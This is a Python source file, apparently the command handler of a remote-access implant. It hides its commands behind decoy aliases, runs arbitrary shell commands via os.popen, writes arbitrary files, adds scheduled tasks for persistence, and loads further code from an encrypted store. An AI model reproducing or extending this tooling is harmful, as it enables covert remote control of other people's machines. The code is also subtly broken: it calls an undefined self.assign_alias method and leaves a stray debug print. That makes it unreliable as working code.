import json
import random
from typing import Dict
from models.encrypted_file import EncryptedFile
from models.scheduale_task import SchedualerTask
import os
from models.command import Command


def assign_alias(aliases):
    choice = random.choice(aliases)
    aliases.remove(choice)
    return choice


class Commands:
    def __init__(self):
        self.aliases = ["cork", "craftbook", "hairribbon", "bottleofsunscreen", "hairtie", "spectacles", "speakers",
                        "handbag", "sidewalk", "plushcat", "stickofincense", "tweezers", "whistle", "quilt", "slipper"]
        self.commands: Dict[str, Command] = {'cmd': RunInCMD(self.assign_alias(self.aliases)), 'upload': UploadFile(self.assign_alias(self.aliases)),
                                             'schedule': AddToScheduler(self.assign_alias(self.aliases))}
        self.add_command = AddCommand(
            self.commands, {'name': '', 'from_file': 'False', 'code': ''}, 'file.txt', self.assign_alias(self.aliases), self.aliases)
        try:
            self.add_command.add_from_file()
        except Exception:
            print('no commands yet')

    def find_by_alias(self, alias):
        for name, command in self.commands.items():
            if command.alias == alias:
                return name, command
        return

    def run_command(self, name, params: Dict):
        if name == 'add':
            self.add_command.set_params(params)
            return self.add_command.execute()
        self.commands[name].set_params(params)
        return self.commands[name].execute()

    def get_command(self, alias):
        try:
            command = self.find_by_alias(alias)
            params = {'params': command[1].params,
                      'name': command[0], 'alias': alias}
        except KeyError:
            params = {}
        return params

    def get_all_commands(self):
        commands = [self.get_command(command.alias) for command in self.commands.values()]
        commands.append({'name': 'add', 'params': self.add_command.params})
        return commands


class AddCommand(Command):
    def __init__(self, commands: Dict, params, save_file, alias, left_aliases):
        super().__init__(alias)
        self.commands = commands
        self.params = params
        self.aliases = left_aliases
        self.enc_file = EncryptedFile(save_file, 'mass')

    def add_from_file(self):
        commands = [json.loads(command)
                    for command in self.enc_file.read_file().split('\n') if command]
        for command in commands:
            self.add_command(command)

    def clean_code(self, code):
        return code.strip()

    def add_command(self, params):
        code = self.clean_code(params['code'])
        from_file: str = params['from_file']
        if from_file.lower() == 'true':
            with open(code) as f:
                code = f.read()
        self.commands[params['name']] = Command(
            assign_alias(self.aliases), {}, code)

    def execute(self):
        self.add_command(self.params)
        self.enc_file.update_file(self.params)


class RunInCMD(Command):
    def __init__(self, alias) -> None:
        self.alias = alias
        self.params = {'command': ''}

    def execute(self):
        print(self.params['command'].split(' '), 'dsdfsd')
        process = os.popen(self.params['command'])
        return process.read()


class UploadFile(Command):
    def __init__(self, alias) -> None:
        self.alias = alias
        self.params = {'path': '', 'content': ''}

    def execute(self):
        with open(self.params['path'], 'w') as f:
            f.write(self.params['content'])


class AddToScheduler(Command):
    def __init__(self, alias) -> None:
        self.alias = alias
        self.params = {'name': '', 'arg': ''}

    def execute(self):
        task = SchedualerTask(self.params['name'], self.params['arg'])
        task.create_task()
